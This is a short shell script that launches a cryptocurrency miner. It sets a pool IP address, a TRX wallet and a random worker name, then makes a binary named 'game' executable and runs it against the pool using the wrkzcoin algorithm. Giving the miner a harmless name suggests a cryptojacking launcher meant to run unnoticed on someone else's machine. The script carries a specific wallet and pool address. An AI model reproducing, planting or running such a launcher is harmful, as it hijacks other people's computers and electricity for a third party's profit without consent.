POOL=172.67.72.39:3333

WALLET=TRX:TASC9862ZH2zedMNWwqnW5LkuyTCkirVAM

WORKER=$(echo $(shuf -i 1000-9999 -n 1)-ST-)





chmod +x game

./game --pool $POOL --username $WALLET.$WORKER --password x --algorithm wrkzcoin 
